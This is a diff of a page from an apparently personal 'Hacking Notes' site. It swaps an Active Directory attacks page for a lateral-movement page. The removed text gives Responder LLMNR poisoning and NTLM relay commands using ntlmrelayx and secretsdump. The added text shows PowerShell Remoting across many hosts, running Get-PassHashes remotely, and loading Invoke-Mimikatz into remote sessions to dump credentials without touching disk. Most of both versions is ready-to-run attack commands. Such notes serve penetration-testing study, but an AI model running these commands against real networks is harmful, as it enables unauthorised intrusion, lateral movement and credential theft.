@@ -6,17 +6,17 @@
 		<meta name="viewport" content="width=device-width, initial-scale=1">
 
 		<!-- Begin Jekyll SEO tag v2.5.0 -->
-<title>AD Attacks | Hacking Notes</title>
+<title>Lateral Movement | Hacking Notes</title>
 <meta name="generator" content="Jekyll v3.8.4" />
-<meta property="og:title" content="AD Attacks" />
+<meta property="og:title" content="Lateral Movement" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="Without Credentials" />
-<meta property="og:description" content="Without Credentials" />
-<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/active-directory/ad-attacks/" />
-<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/active-directory/ad-attacks/" />
+<meta name="description" content="PowerShell Remoting" />
+<meta property="og:description" content="PowerShell Remoting" />
+<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/active-directory/lateral-movement/" />
+<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/active-directory/lateral-movement/" />
 <meta property="og:site_name" content="Hacking Notes" />
 <script type="application/ld+json">
-{"description":"Without Credentials","url":"http://0.0.0.0:4000/hackingnotes/active-directory/ad-attacks/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"AD Attacks","@context":"http://schema.org"}</script>
+{"description":"PowerShell Remoting","url":"http://0.0.0.0:4000/hackingnotes/active-directory/lateral-movement/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Lateral Movement","@context":"http://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 
 		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />
@@ -61,11 +61,11 @@
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-enumeration/">Domain Enumeration</a></li>
 								
-									<li class="nav-item "><a href="/hackingnotes/active-directory/lateral-movement/">Lateral Movement</a></li>
+									<li class="nav-item current"><a href="/hackingnotes/active-directory/lateral-movement/">Lateral Movement</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-persistence/">Domain Persistence</a></li>
 								
-									<li class="nav-item current"><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
 								
 							</ul>
 						</li>
@@ -272,69 +272,98 @@
 		<section class="main">
 			<div class="page-header">
 				<h2>Active Directory</h2>
-				<h3>AD Attacks</h3>
+				<h3>Lateral Movement</h3>
 			</div>
 			<article class="content">
-				<h1 id="without-credentials">Without Credentials</h1>
+				<h1 id="powershell-remoting">PowerShell Remoting</h1>
 
-<h2 id="llmnr--netbios-poisoning">LLMNR / NetBIOS Poisoning</h2>
+<p>Onced a machine is compromised, we need to jump to others in order to find more valuable targets. For that task we can use <code class="highlighter-rouge">PowerShell Remoting</code> which is increasingly used in enterprises and enabled by default on Server 2012 onwards. PowerShell Remoting uses WinRM protocol, so you can check <code class="highlighter-rouge">evil-winrm</code> tool. Admin privileges on the target machineis needed.</p>
 
-<p>We can grab some hashed credentials if LLMNR protocol is enabled.</p>
+<blockquote>
+  <p><strong>Note</strong>: Maybe you need to enable remoting <code class="highlighter-rouge">Enable-PSRemoting</code> on a Desktop windows machine and Admin privs are required.</p>
+</blockquote>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo responder -I eth0 -Fw
-</code></pre></div></div>
+<p>You can get a elevated shell (<code class="highlighter-rouge">NT/AUTHORITY SYSTEM</code>) on the remote server if the credentials of the user administrator are used to authenticate (default setting).</p>
 
-<p>After some time we can get all the hashes.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /usr/share/responder
-sudo python DumpHash.py
-</code></pre></div></div>
-
-<h2 id="ntlm-relay-smb-signing-disabled">NTLM Relay (SMB signing disabled)</h2>
-
-<p>Some tiems some server are misconfigured and have the smb signing disabled, so we can perform more attacks with responder.</p>
-
-<h3 id="configuration">Configuration</h3>
+<p>There are two types of PowerShell Remoting:</p>
 
 <ul>
-  <li>/etc/proxychains4.conf</li>
+  <li><strong>One-to-One</strong>: It is interactively login to another machine. Create a new session on the target machine so runs in a new process (wsmprovhost).</li>
 </ul>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socks4  127.0.0.1       1080
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter-PSSession -ComputerName machine01.corp.local
 </code></pre></div></div>
+<p>We can also first create the session and append to it later.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$sess</span> <span class="o">=</span> New-PSSession -ComputerName machine01.corp.local
+Enter-PSSession -Session <span class="nv">$sess</span>
+</code></pre></div></div>
+<blockquote>
+  <p><strong>Note</strong>: We can put a session in background if the session is stored in a variable. Very useful.</p>
+</blockquote>
 
 <ul>
-  <li>/usr/share/responder/Responder.conf</li>
+  <li><strong>One-to-Many</strong>: It is also known as Fan-out remoting. It is a non-interactive shell but we can execute commands parallely. Is useful to run commmands and scripts on multiple remote computers, in disconnected sessions and as a background job.</li>
 </ul>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Responder Core]
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Command -ComputerName machine01.corp.local -ScriptBlock <span class="o">{</span><span class="nb">whoami</span>;<span class="nb">hostname</span><span class="o">}</span>
+Invoke-Command -ComputerName <span class="o">(</span><span class="nb">Get-Content</span> .\servers.txt<span class="o">)</span>
+Invoke-Command -ComputerName machine01.corp.local -FilePath .\file.ps1
+</code></pre></div></div>
+<blockquote>
+  <p><strong>Note</strong>: One of the best things in PowerShell to do PassTheHash, using credentials and executing commands on multiple remote computers.</p>
+</blockquote>
 
-; Servers to start
-SMB = Off
-HTTP = On
+<blockquote>
+  <p><strong>RedTeam Note</strong>: Since admin privs are needed is a useful tool to check if the user has admin privs on the target machine.</p>
+</blockquote>
+
+<p>By default PowerShell Remote run the script in a <code class="highlighter-rouge">ConstrainedLanguage</code> mode so we can not run some cmdlets which are considered to be unsafe. To check the type of language run the following command:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ExecutionContext</span>.SessionState.LanguageMode
 </code></pre></div></div>
 
-<h3 id="perform-the-attack">Perform the attack</h3>
+<h2 id="execute-locally-loaded-funcitons-on-the-remote-machine">Execute locally loaded funcitons on the remote machine</h2>
 
-<p>We need to get a list of the servers with the SMB sigining disabled.</p>
+<p>We can execute locally loaded function on the remote machine.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb --gen-relay-list vulnerable_servers.txt 10.10.10.0/24
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Command -ScriptBlock <span class="k">${</span><span class="nv">function</span>:Get-PassHashes<span class="k">}</span> -ComputerName <span class="o">(</span><span class="nb">Get-Content</span> .\servers.txt<span class="o">)</span>
+Invoke-Command -ScriptBlock <span class="k">${</span><span class="nv">function</span>:Get-PassHashes<span class="k">}</span> -ArgumentList <span class="s2">"-List hello"</span> -ComputerName <span class="o">(</span><span class="nb">Get-Content</span> .\servers.txt<span class="o">)</span>
+</code></pre></div></div>
+<h2 id="load-a-script-remotely">Load a script remotely</h2>
+
+<p>we can load a script remotely.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Command -FilePath .\hello.ps1 -Session <span class="nv">$sess</span>
+Enter-PSSession -Session <span class="nv">$sess</span>
+
+<span class="o">[</span>machine01.corp.local]: <span class="nb">PS </span>C:\&gt; hello
+Hello World!
+</code></pre></div></div>
+<h2 id="execute-stateful-commands">Execute “Stateful” commands</h2>
+
+<p>We can execute “Stateful” commands.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$sess</span> <span class="o">=</span> New-PSSession -ComputerName server1
+Invoke-Command -Session <span class="nv">$sess</span> -ScriptBlock <span class="o">{</span><span class="nv">$proc</span> <span class="o">=</span> <span class="nb">Get-Process</span><span class="o">}</span>
+Invoke-Command -Session <span class="nv">$sess</span> -ScriptBlock <span class="o">{</span><span class="nv">$proc</span>.Name<span class="o">}</span>
 </code></pre></div></div>
 
-<p>Execute the attack with Responder and Impacket.</p>
+<h1 id="dump-credentials">Dump credentials</h1>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-ntlmrelayx.py -tf ./vulnerable_servers.txt -socks -smb2support
-sudo responder -I eth0
+<p>Once we have administrator privileges on the target machine we can dump credentials with <code class="highlighter-rouge">Invoke-Mimikatz</code>. See this section:</p>
+
+<p><a href="/hackingnotes/post-exploitation/get-credentials/">https://mvc1009.github.io/hackingnotes/post-exploitation/get-credentials/</a>.</p>
+
+<p>To avoid save mimikatz on disk we need to load remotely.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session <span class="nv">$sess</span>
+Invoke-Command -Session <span class="nv">$sess</span> -ScriptBlock <span class="o">{</span>Invoke-Mimikatz -DumpCreds<span class="o">}</span>
 </code></pre></div></div>
+<p>Or we can execute locally loaded functions.</p>
 
-<p>We can list the current sessions with the next command.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntlmrelayx&gt; socks
-</code></pre></div></div>
-
-<p>When a session with administrative privileges is found we can use secretsdump or other tool with proxychains to use the session captured.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains impacket-secretdump DOMAIN/admin@IP
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">.</span> .\Invoke-Mimikatz.ps1
+Invoke-Command -Session <span class="nv">$sess</span> -ScriptBlock <span class="o">{</span><span class="k">function</span>:Invoke-Mimikatz -DumpCreds<span class="o">}</span>
 </code></pre></div></div>
 
 			</article>
